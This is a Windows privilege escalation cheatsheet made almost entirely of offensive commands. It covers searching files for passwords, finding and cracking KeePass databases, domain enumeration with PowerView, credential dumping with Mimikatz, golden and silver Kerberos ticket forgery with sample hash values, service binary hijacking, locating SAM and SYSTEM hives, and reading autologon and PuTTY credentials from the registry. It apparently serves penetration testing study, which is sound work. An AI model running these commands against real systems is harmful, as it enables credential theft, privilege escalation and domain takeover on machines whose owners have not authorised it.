# Windows Privilege Escalation Cheatsheet

## General Information and Information Gathering

```powershell
net user  ## Display user group information.
icacls C:\Windows\System32\config\SAM  ## Check if the SAM file has write permissions.
set   ## Display environment variables, sometimes passwords can be stored here.
systeminfo  ## Get system and hardware information.
ipconfig  ## View network configuration.
type C:\Windows\System32\license.rtf  ## Display operating system version.
ver  ## Display the kernel version, useful for checking kernel exploits.
whoami /priv  ## View user privileges.
tasklist | findstr /i "SYSTEM"  ## Check which SYSTEM processes are running.
ipconfig /all  ## Display network connections, check for subnets.
route print  ## Show routing table.
netstat -ano  ## Display TCP and UDP socket information.
netsh advfirewall show allprofiles  ## Show network traffic rules.
```

## PowerShell History

```powershell
Get-History
(Get-PSReadlineOption).HistorySavePath
```

## Searching Passwords

```powershell
dir /s *pass* *.config
findstr /si password *.xml *.ini *.txt *.log *.conf *.config *.json *.yml *.sql *.php
```

## KDBX File Discovery

```powershell
CMD> dir /s /b *.kdbx
PS> Get-ChildItem -Recurse -Filter *.kdbx
PS> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

# Cracking
keepass2john Database.kdbx > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

## PowerView Commands

```powershell
powershell -ep bypass # Bypass the PowerShell execution policy
Import-Module .\PowerView.ps1 # Load the PowerView module

Get-NetDomain # Get basic information about the current domain
Get-NetUser # List all users in the domain
Get-NetUser | select cn # Display only the user common names (CN)
Get-NetGroup # Enumerate all domain groups
Get-NetGroup "group name" # Get information about a specific group
Get-NetGroup "Domain Admins" | select member # List members of the "Domain Admins" group
Get-NetComputer # Enumerate all computer objects in the domain
Find-LocalAdminAccess # Check if the current user has local admin rights on any machine in the domain
Get-NetSession -ComputerName files04 -Verbose # Show logged-on users for the specified computer with verbose output
Get-NetUser -SPN | select samaccountname,serviceprincipalname # List SPN accounts (potential Kerberoasting targets)
Get-ObjectAcl -Identity <user> # Enumerate the ACL (Access Control List) for a specified user
Convert-SidToName <sid/objsid> # Convert a given SID (Security Identifier) to a username
Find-DomainShare # Find shared folders in the domain
Get-DomainUser -PreauthNotRequired -verbose # Identify AS-REP roastable accounts (no pre-authentication required)
```

## Mimikatz Usage

### One-Liner Commands

```powershell
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit" > mimikatz.txt
```

### Golden Ticket

```powershell
.\mimikatz.exe
privilege::debug
lsadump::lsa /inject /name:krbtgt
kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500
misc::cmd
klist
dir \\<RHOST>\admin$
```

### Silver Ticket

```powershell
.\mimikatz.exe
privilege::debug
lsadump::lsa /inject /name:<ServiceAccount>
kerberos::tgs /user:<UserName> /domain:<DomainName> /sid:<DomainSID> /rc4:<ServiceAccountNTLMHash> /service:<Service>/<TargetMachine> /target:<TargetMachine> /id:<UserRID> /ptt
misc::cmd
klist
dir \\<RHOST>\admin$
```

## Service Binary Hijacking

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
icacls "path"
sc qc <servicename>
sc config <service> <option>="<value>"
sc start <servicename>
```

## Scheduled Tasks

```powershell
schtasks /query /fo LIST /v
icacls "path"
```

## SAM & SYSTEM File Discovery

```powershell
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system

C:\windows.old

dir /s SAM
dir /s SYSTEM
```

## Registry Keys

### Autologon

```powershell
PS> Get-Item -path "HKLM:\Software\Microsoft\Windows nt\Currentversion\Winlogon"
CMD> reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

### HKEY Current User

```powershell
CMD> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
CMD> reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
```

## PuTTY Sessions

```powershell
PS> Get-ItemProperty -Path "HKCU:\Software\SimonTatham\PuTTY\Sessions"
PS> Get-ChildItem -Path "HKCU:\Software\SimonTatham\PuTTY\Sessions"
CMD> reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
```

## Remote Desktop Connection

```powershell
mstsc /v:192.168.1.1
